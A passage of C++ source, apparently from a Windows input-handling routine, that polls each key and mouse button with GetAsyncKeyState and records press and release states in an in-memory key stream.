            if ((keyState = ::GetAsyncKeyState(VK_F5))) keyState & keySize ? keyStream.add(F5, true) : keyStream.add(F5, false); else if (keyStream.has(F5)) { KeyInformation& keyInformation = keyStream.get(F5); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F6))) keyState & keySize ? keyStream.add(F6, true) : keyStream.add(F6, false); else if (keyStream.has(F6)) { KeyInformation& keyInformation = keyStream.get(F6); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F7))) keyState & keySize ? keyStream.add(F7, true) : keyStream.add(F7, false); else if (keyStream.has(F7)) { KeyInformation& keyInformation = keyStream.get(F7); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F8))) keyState & keySize ? keyStream.add(F8, true) : keyStream.add(F8, false); else if (keyStream.has(F8)) { KeyInformation& keyInformation = keyStream.get(F8); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F9))) keyState & keySize ? keyStream.add(F9, true) : keyStream.add(F9, false); else if (keyStream.has(F9)) { KeyInformation& keyInformation = keyStream.get(F9); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F10))) keyState & keySize ? keyStream.add(F10, true) : keyStream.add(F10, false); else if (keyStream.has(F10)) { KeyInformation& keyInformation = keyStream.get(F10); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F11))) keyState & keySize ? keyStream.add(F11, true) : keyStream.add(F11, false); else if (keyStream.has(F11)) { KeyInformation& keyInformation = keyStream.get(F11); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F12))) keyState & keySize ? keyStream.add(F12, true) : keyStream.add(F12, false); else if (keyStream.has(F12)) { KeyInformation& keyInformation = keyStream.get(F12); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F13))) keyState & keySize ? keyStream.add(F13, true) : keyStream.add(F13, false); else if (keyStream.has(F13)) { KeyInformation& keyInformation = keyStream.get(F13); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F14))) keyState & keySize ? keyStream.add(F14, true) : keyStream.add(F14, false); else if (keyStream.has(F14)) { KeyInformation& keyInformation = keyStream.get(F14); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F15))) keyState & keySize ? keyStream.add(F15, true) : keyStream.add(F15, false); else if (keyStream.has(F15)) { KeyInformation& keyInformation = keyStream.get(F15); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F16))) keyState & keySize ? keyStream.add(F16, true) : keyStream.add(F16, false); else if (keyStream.has(F16)) { KeyInformation& keyInformation = keyStream.get(F16); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F17))) keyState & keySize ? keyStream.add(F17, true) : keyStream.add(F17, false); else if (keyStream.has(F17)) { KeyInformation& keyInformation = keyStream.get(F17); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F18))) keyState & keySize ? keyStream.add(F18, true) : keyStream.add(F18, false); else if (keyStream.has(F18)) { KeyInformation& keyInformation = keyStream.get(F18); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F19))) keyState & keySize ? keyStream.add(F19, true) : keyStream.add(F19, false); else if (keyStream.has(F19)) { KeyInformation& keyInformation = keyStream.get(F19); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F20))) keyState & keySize ? keyStream.add(F20, true) : keyStream.add(F20, false); else if (keyStream.has(F20)) { KeyInformation& keyInformation = keyStream.get(F20); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F21))) keyState & keySize ? keyStream.add(F21, true) : keyStream.add(F21, false); else if (keyStream.has(F21)) { KeyInformation& keyInformation = keyStream.get(F21); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F22))) keyState & keySize ? keyStream.add(F22, true) : keyStream.add(F22, false); else if (keyStream.has(F22)) { KeyInformation& keyInformation = keyStream.get(F22); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F23))) keyState & keySize ? keyStream.add(F23, true) : keyStream.add(F23, false); else if (keyStream.has(F23)) { KeyInformation& keyInformation = keyStream.get(F23); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F24))) keyState & keySize ? keyStream.add(F24, true) : keyStream.add(F24, false); else if (keyStream.has(F24)) { KeyInformation& keyInformation = keyStream.get(F24); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_HELP))) keyState & keySize ? keyStream.add(Help, true) : keyStream.add(Help, false); else if (keyStream.has(Help)) { KeyInformation& keyInformation = keyStream.get(Help); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_HOME))) keyState & keySize ? keyStream.add(Home, true) : keyStream.add(Home, false); else if (keyStream.has(Home)) { KeyInformation& keyInformation = keyStream.get(Home); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_TAB))) keyState & keySize ? keyStream.add(HorizontalTab, true) : keyStream.add(HorizontalTab, false); else if (keyStream.has(HorizontalTab)) { KeyInformation& keyInformation = keyStream.get(HorizontalTab); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_ACCEPT))) keyState & keySize ? keyStream.add(IMEAccept, true) : keyStream.add(IMEAccept, false); else if (keyStream.has(IMEAccept)) { KeyInformation& keyInformation = keyStream.get(IMEAccept); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_CONVERT))) keyState & keySize ? keyStream.add(IMEConvert, true) : keyStream.add(IMEConvert, false); else if (keyStream.has(IMEConvert)) { KeyInformation& keyInformation = keyStream.get(IMEConvert); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_FINAL))) keyState & keySize ? keyStream.add(IMEFinal, true) : keyStream.add(IMEFinal, false); else if (keyStream.has(IMEFinal)) { KeyInformation& keyInformation = keyStream.get(IMEFinal); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_HANJA))) keyState & keySize ? keyStream.add(IMEHanja, true) : keyStream.add(IMEHanja, false); else if (keyStream.has(IMEHanja)) { KeyInformation& keyInformation = keyStream.get(IMEHanja); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_HANGUL))) keyState & keySize ? keyStream.add(IMEHangul, true) : keyStream.add(IMEHangul, false); else if (keyStream.has(IMEHangul)) { KeyInformation& keyInformation = keyStream.get(IMEHangul); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_JUNJA))) keyState & keySize ? keyStream.add(IMEJunja, true) : keyStream.add(IMEJunja, false); else if (keyStream.has(IMEJunja)) { KeyInformation& keyInformation = keyStream.get(IMEJunja); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_KANA))) keyState & keySize ? keyStream.add(IMEKana, true) : keyStream.add(IMEKana, false); else if (keyStream.has(IMEKana)) { KeyInformation& keyInformation = keyStream.get(IMEKana); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_KANJI))) keyState & keySize ? keyStream.add(IMEKanji, true) : keyStream.add(IMEKanji, false); else if (keyStream.has(IMEKanji)) { KeyInformation& keyInformation = keyStream.get(IMEKanji); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_MODECHANGE))) keyState & keySize ? keyStream.add(IMEModeChangeRequest, true) : keyStream.add(IMEModeChangeRequest, false); else if (keyStream.has(IMEModeChangeRequest)) { KeyInformation& keyInformation = keyStream.get(IMEModeChangeRequest); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NONCONVERT))) keyState & keySize ? keyStream.add(IMENonConvert, true) : keyStream.add(IMENonConvert, false); else if (keyStream.has(IMENonConvert)) { KeyInformation& keyInformation = keyStream.get(IMENonConvert); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_PROCESSKEY))) keyState & keySize ? keyStream.add(IMEProcess, true) : keyStream.add(IMEProcess, false); else if (keyStream.has(IMEProcess)) { KeyInformation& keyInformation = keyStream.get(IMEProcess); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_INSERT))) keyState & keySize ? keyStream.add(Insert, true) : keyStream.add(Insert, false); else if (keyStream.has(Insert)) { KeyInformation& keyInformation = keyStream.get(Insert); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_APP1))) keyState & keySize ? keyStream.add(LaunchApplication1, true) : keyStream.add(LaunchApplication1, false); else if (keyStream.has(LaunchApplication1)) { KeyInformation& keyInformation = keyStream.get(LaunchApplication1); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_APP2))) keyState & keySize ? keyStream.add(LaunchApplication2, true) : keyStream.add(LaunchApplication2, false); else if (keyStream.has(LaunchApplication2)) { KeyInformation& keyInformation = keyStream.get(LaunchApplication2); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LEFT))) keyState & keySize ? keyStream.add(LeftArrow, true) : keyStream.add(LeftArrow, false); else if (keyStream.has(LeftArrow)) { KeyInformation& keyInformation = keyStream.get(LeftArrow); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LWIN))) keyState & keySize ? keyStream.add(LeftWindowsMeta, true) : keyStream.add(LeftWindowsMeta, false); else if (keyStream.has(LeftWindowsMeta)) { KeyInformation& keyInformation = keyStream.get(LeftWindowsMeta); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_MEDIA_NEXT_TRACK))) keyState & keySize ? keyStream.add(MediaNextTrack, true) : keyStream.add(MediaNextTrack, false); else if (keyStream.has(MediaNextTrack)) { KeyInformation& keyInformation = keyStream.get(MediaNextTrack); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_MEDIA_PLAY_PAUSE))) keyState & keySize ? keyStream.add(MediaPlayPause, true) : keyStream.add(MediaPlayPause, false); else if (keyStream.has(MediaPlayPause)) { KeyInformation& keyInformation = keyStream.get(MediaPlayPause); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_MEDIA_PREV_TRACK))) keyState & keySize ? keyStream.add(MediaPreviousTrack, true) : keyStream.add(MediaPreviousTrack, false); else if (keyStream.has(MediaPreviousTrack)) { KeyInformation& keyInformation = keyStream.get(MediaPreviousTrack); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_MEDIA_STOP))) keyState & keySize ? keyStream.add(MediaStop, true) : keyStream.add(MediaStop, false); else if (keyStream.has(MediaStop)) { KeyInformation& keyInformation = keyStream.get(MediaStop); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMLOCK))) keyState & keySize ? keyStream.add(NumberLock, true) : keyStream.add(NumberLock, false); else if (keyStream.has(NumberLock)) { KeyInformation& keyInformation = keyStream.get(NumberLock); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD0))) keyState & keySize ? keyStream.add(NumberPad0, true) : keyStream.add(NumberPad0, false); else if (keyStream.has(NumberPad0)) { KeyInformation& keyInformation = keyStream.get(NumberPad0); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD1))) keyState & keySize ? keyStream.add(NumberPad1, true) : keyStream.add(NumberPad1, false); else if (keyStream.has(NumberPad1)) { KeyInformation& keyInformation = keyStream.get(NumberPad1); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD2))) keyState & keySize ? keyStream.add(NumberPad2, true) : keyStream.add(NumberPad2, false); else if (keyStream.has(NumberPad2)) { KeyInformation& keyInformation = keyStream.get(NumberPad2); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD3))) keyState & keySize ? keyStream.add(NumberPad3, true) : keyStream.add(NumberPad3, false); else if (keyStream.has(NumberPad3)) { KeyInformation& keyInformation = keyStream.get(NumberPad3); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD4))) keyState & keySize ? keyStream.add(NumberPad4, true) : keyStream.add(NumberPad4, false); else if (keyStream.has(NumberPad4)) { KeyInformation& keyInformation = keyStream.get(NumberPad4); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD5))) keyState & keySize ? keyStream.add(NumberPad5, true) : keyStream.add(NumberPad5, false); else if (keyStream.has(NumberPad5)) { KeyInformation& keyInformation = keyStream.get(NumberPad5); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD6))) keyState & keySize ? keyStream.add(NumberPad6, true) : keyStream.add(NumberPad6, false); else if (keyStream.has(NumberPad6)) { KeyInformation& keyInformation = keyStream.get(NumberPad6); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD7))) keyState & keySize ? keyStream.add(NumberPad7, true) : keyStream.add(NumberPad7, false); else if (keyStream.has(NumberPad7)) { KeyInformation& keyInformation = keyStream.get(NumberPad7); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD8))) keyState & keySize ? keyStream.add(NumberPad8, true) : keyStream.add(NumberPad8, false); else if (keyStream.has(NumberPad8)) { KeyInformation& keyInformation = keyStream.get(NumberPad8); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NUMPAD9))) keyState & keySize ? keyStream.add(NumberPad9, true) : keyStream.add(NumberPad9, false); else if (keyStream.has(NumberPad9)) { KeyInformation& keyInformation = keyStream.get(NumberPad9); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_NEXT))) keyState & keySize ? keyStream.add(PageDown, true) : keyStream.add(PageDown, false); else if (keyStream.has(PageDown)) { KeyInformation& keyInformation = keyStream.get(PageDown); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_PRIOR))) keyState & keySize ? keyStream.add(PageUp, true) : keyStream.add(PageUp, false); else if (keyStream.has(PageUp)) { KeyInformation& keyInformation = keyStream.get(PageUp); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_PLAY))) keyState & keySize ? keyStream.add(Play, true) : keyStream.add(Play, false); else if (keyStream.has(Play)) { KeyInformation& keyInformation = keyStream.get(Play); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_SNAPSHOT))) keyState & keySize ? keyStream.add(PrintScreen, true) : keyStream.add(PrintScreen, false); else if (keyStream.has(PrintScreen)) { KeyInformation& keyInformation = keyStream.get(PrintScreen); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LBUTTON))) keyState & keySize ? keyStream.add(MouseLeftButton, true) : keyStream.add(MouseLeftButton, false); else if (keyStream.has(MouseLeftButton)) { KeyInformation& keyInformation = keyStream.get(MouseLeftButton); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_MBUTTON))) keyState & keySize ? keyStream.add(MouseMiddleButton, true) : keyStream.add(MouseMiddleButton, false); else if (keyStream.has(MouseMiddleButton)) { KeyInformation& keyInformation = keyStream.get(MouseMiddleButton); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_RBUTTON))) keyState & keySize ? keyStream.add(MouseRightButton, true) : keyStream.add(MouseRightButton, false); else if (keyStream.has(MouseRightButton)) { KeyInformation& keyInformation = keyStream.get(MouseRightButton); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_XBUTTON1))) keyState & keySize ? keyStream.add(MouseX1Button, true) : keyStream.add(MouseX1Button, false); else if (keyStream.has(MouseX1Button)) { KeyInformation& keyInformation = keyStream.get(MouseX1Button); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_XBUTTON2))) keyState & keySize ? keyStream.add(MouseX2Button, true) : keyStream.add(MouseX2Button, false); else if (keyStream.has(MouseX2Button)) { KeyInformation& keyInformation = keyStream.get(MouseX2Button); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_PA1))) keyState & keySize ? keyStream.add(PA1, true) : keyStream.add(PA1, false); else if (keyStream.has(PA1)) { KeyInformation& keyInformation = keyStream.get(PA1); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_CLEAR))) keyState & keySize ? keyStream.add(OEMClear, true) : keyStream.add(OEMClear, false); else if (keyStream.has(OEMClear)) { KeyInformation& keyInformation = keyStream.get(OEMClear); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_102))) keyState & keySize ? keyStream.add(OEMMiscellaneous, true) : keyStream.add(OEMMiscellaneous, false); else if (keyStream.has(OEMMiscellaneous)) { KeyInformation& keyInformation = keyStream.get(OEMMiscellaneous); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = (
                ::GetAsyncKeyState(0x92) || ::GetAsyncKeyState(0x93) || ::GetAsyncKeyState(0x94) || ::GetAsyncKeyState(0x95) || ::GetAsyncKeyState(0x96) ||
                ::GetAsyncKeyState(0xE1) ||
                ::GetAsyncKeyState(0xE3) || ::GetAsyncKeyState(0xE4) ||
                ::GetAsyncKeyState(0xE6) ||
                ::GetAsyncKeyState(0xE9) || ::GetAsyncKeyState(0xEA) || ::GetAsyncKeyState(0xEB) || ::GetAsyncKeyState(0xEC) || ::GetAsyncKeyState(0xED) || ::GetAsyncKeyState(0xEF) || ::GetAsyncKeyState(0xF0) || ::GetAsyncKeyState(0xF1) || ::GetAsyncKeyState(0xF2) || ::GetAsyncKeyState(0xF3) || ::GetAsyncKeyState(0xF4) || ::GetAsyncKeyState(0xF5)
            ))) keyState & keySize ? keyStream.add(OEMSpecific, true) : keyStream.add(OEMSpecific, false); else if (keyStream.has(OEMSpecific)) { KeyInformation& keyInformation = keyStream.get(OEMSpecific); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_1))) keyState & keySize ? keyStream.add(OEMMiscellaneous1, true) : keyStream.add(OEMMiscellaneous1, false); else if (keyStream.has(OEMMiscellaneous1)) { KeyInformation& keyInformation = keyStream.get(OEMMiscellaneous1); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_2))) keyState & keySize ? keyStream.add(OEMMiscellaneous2, true) : keyStream.add(OEMMiscellaneous2, false); else if (keyStream.has(OEMMiscellaneous2)) { KeyInformation& keyInformation = keyStream.get(OEMMiscellaneous2); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_3))) keyState & keySize ? keyStream.add(OEMMiscellaneous3, true) : keyStream.add(OEMMiscellaneous3, false); else if (keyStream.has(OEMMiscellaneous3)) { KeyInformation& keyInformation = keyStream.get(OEMMiscellaneous3); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_4))) keyState & keySize ? keyStream.add(OEMMiscellaneous4, true) : keyStream.add(OEMMiscellaneous4, false); else if (keyStream.has(OEMMiscellaneous4)) { KeyInformation& keyInformation = keyStream.get(OEMMiscellaneous4); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_5))) keyState & keySize ? keyStream.add(OEMMiscellaneous5, true) : keyStream.add(OEMMiscellaneous5, false); else if (keyStream.has(OEMMiscellaneous5)) { KeyInformation& keyInformation = keyStream.get(OEMMiscellaneous5); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_6))) keyState & keySize ? keyStream.add(OEMMiscellaneous6, true) : keyStream.add(OEMMiscellaneous6, false); else if (keyStream.has(OEMMiscellaneous6)) { KeyInformation& keyInformation = keyStream.get(OEMMiscellaneous6); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_7))) keyState & keySize ? keyStream.add(OEMMiscellaneous7, true) : keyStream.add(OEMMiscellaneous7, false); else if (keyStream.has(OEMMiscellaneous7)) { KeyInformation& keyInformation = keyStream.get(OEMMiscellaneous7); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_8))) keyState & keySize ? keyStream.add(OEMMiscellaneous8, true) : keyStream.add(OEMMiscellaneous8, false); else if (keyStream.has(OEMMiscellaneous8)) { KeyInformation& keyInformation = keyStream.get(OEMMiscellaneous8); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_COMMA))) keyState & keySize ? keyStream.add(OEMCommaSymbol, true) : keyStream.add(OEMCommaSymbol, false); else if (keyStream.has(OEMCommaSymbol)) { KeyInformation& keyInformation = keyStream.get(OEMCommaSymbol); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_MINUS))) keyState & keySize ? keyStream.add(OEMSubtracterSymbol, true) : keyStream.add(OEMSubtracterSymbol, false); else if (keyStream.has(OEMSubtracterSymbol)) { KeyInformation& keyInformation = keyStream.get(OEMSubtracterSymbol); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_PERIOD))) keyState & keySize ? keyStream.add(OEMPeriodSymbol, true) : keyStream.add(OEMPeriodSymbol, false); else if (keyStream.has(OEMPeriodSymbol)) { KeyInformation& keyInformation = keyStream.get(OEMPeriodSymbol); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_OEM_PLUS))) keyState & keySize ? keyStream.add(OEMAdderSymbol, true) : keyStream.add(OEMAdderSymbol, false); else if (keyStream.has(OEMAdderSymbol)) { KeyInformation& keyInformation = keyStream.get(OEMAdderSymbol); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_PAUSE))) keyState & keySize ? keyStream.add(Pause, true) : keyStream.add(Pause, false); else if (keyStream.has(Pause)) { KeyInformation& keyInformation = keyStream.get(Pause); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_PRINT))) keyState & keySize ? keyStream.add(Print, true) : keyStream.add(Print, false); else if (keyStream.has(Print)) { KeyInformation& keyInformation = keyStream.get(Print); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = (
                ::GetAsyncKeyState(VK_NONAME) ||
                ::GetAsyncKeyState(0x0A) || ::GetAsyncKeyState(0x0B) ||
                ::GetAsyncKeyState(0x0E) || ::GetAsyncKeyState(0x0F) ||
                ::GetAsyncKeyState(0x16) ||
                ::GetAsyncKeyState(0x1A) ||
                ::GetAsyncKeyState(0x3A) || ::GetAsyncKeyState(0x40) ||
                ::GetAsyncKeyState(0x5E) ||
                ::GetAsyncKeyState(0xB8) || ::GetAsyncKeyState(0xB9) ||
                ::GetAsyncKeyState(0xC1) || ::GetAsyncKeyState(0xC2) || ::GetAsyncKeyState(0xC3) || ::GetAsyncKeyState(0xC4) || ::GetAsyncKeyState(0xC5) || ::GetAsyncKeyState(0xC6) || ::GetAsyncKeyState(0xC7) || ::GetAsyncKeyState(0xC8) || ::GetAsyncKeyState(0xC9) || ::GetAsyncKeyState(0xCA) || ::GetAsyncKeyState(0xCB) || ::GetAsyncKeyState(0xCC) || ::GetAsyncKeyState(0xCD) || ::GetAsyncKeyState(0xCE) || ::GetAsyncKeyState(0xCF) || ::GetAsyncKeyState(0xD0) || ::GetAsyncKeyState(0xD1) || ::GetAsyncKeyState(0xD2) || ::GetAsyncKeyState(0xD3) || ::GetAsyncKeyState(0xD4) || ::GetAsyncKeyState(0xD5) || ::GetAsyncKeyState(0xD6) || ::GetAsyncKeyState(0xD7) ||
                ::GetAsyncKeyState(0xE0)
            ))) keyState & keySize ? keyStream.add(Reserved, true) : keyStream.add(Reserved, false); else if (keyStream.has(Reserved)) { KeyInformation& keyInformation = keyStream.get(Reserved); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_RIGHT))) keyState & keySize ? keyStream.add(RightArrow, true) : keyStream.add(RightArrow, false); else if (keyStream.has(RightArrow)) { KeyInformation& keyInformation = keyStream.get(RightArrow); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_RWIN))) keyState & keySize ? keyStream.add(RightWindowsMeta, true) : keyStream.add(RightWindowsMeta, false); else if (keyStream.has(RightWindowsMeta)) { KeyInformation& keyInformation = keyStream.get(RightWindowsMeta); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_SCROLL))) keyState & keySize ? keyStream.add(ScrollLock, true) : keyStream.add(ScrollLock, false); else if (keyStream.has(ScrollLock)) { KeyInformation& keyInformation = keyStream.get(ScrollLock); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_SELECT))) keyState & keySize ? keyStream.add(Select, true) : keyStream.add(Select, false); else if (keyStream.has(Select)) { KeyInformation& keyInformation = keyStream.get(Select); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_SEPARATOR))) keyState & keySize ? keyStream.add(Separator, true) : keyStream.add(Separator, false); else if (keyStream.has(Separator)) { KeyInformation& keyInformation = keyStream.get(Separator); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_MEDIA_SELECT))) keyState & keySize ? keyStream.add(SelectMedia, true) : keyStream.add(SelectMedia, false); else if (keyStream.has(SelectMedia)) { KeyInformation& keyInformation = keyStream.get(SelectMedia); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LSHIFT))) keyState & keySize ? keyStream.add(LeftShift, true) : keyStream.add(LeftShift, false); else if (keyStream.has(LeftShift)) { KeyInformation& keyInformation = keyStream.get(LeftShift); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_RSHIFT))) keyState & keySize ? keyStream.add(RightShift, true) : keyStream.add(RightShift, false); else if (keyStream.has(RightShift)) { KeyInformation& keyInformation = keyStream.get(RightShift); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
